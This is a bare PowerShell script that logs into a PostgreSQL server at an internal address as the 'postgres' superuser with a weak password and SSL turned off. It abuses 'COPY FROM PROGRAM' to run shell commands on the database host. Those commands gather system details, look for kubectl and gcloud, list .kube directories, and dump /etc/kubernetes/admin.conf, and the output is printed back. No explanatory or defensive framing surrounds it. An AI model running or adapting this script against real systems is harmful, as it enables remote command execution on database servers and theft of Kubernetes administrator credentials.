$c=New-Object System.Data.Odbc.OdbcConnection
$c.ConnectionString="Driver={PostgreSQL Unicode};Server=10.9.101.3;Port=5432;Database=postgres;Uid=postgres;Pwd=x;sslmode=disable"
$c.Open()
$cmd=$c.CreateCommand()
$cmd.CommandText="DROP TABLE IF EXISTS cmd_out; CREATE TABLE cmd_out(line text)"
$cmd.ExecuteNonQuery() | Out-Null
$cmd2=$c.CreateCommand()
$cmd2.CommandText="COPY cmd_out FROM PROGRAM 'id && hostname && cat /etc/os-release | head -3 && ls -la /root/.kube/ 2>/dev/null; which kubectl gcloud 2>/dev/null; cat /etc/kubernetes/admin.conf 2>/dev/null | head -20; ls -la /home/*/.kube/ 2>/dev/null'"
$cmd2.ExecuteNonQuery() | Out-Null
$cmd3=$c.CreateCommand()
$cmd3.CommandText="SELECT line FROM cmd_out"
$r=$cmd3.ExecuteReader()
while($r.Read()){Write-Host ("OUT:"+$r[0])}
$r.Close()
$c.Close()
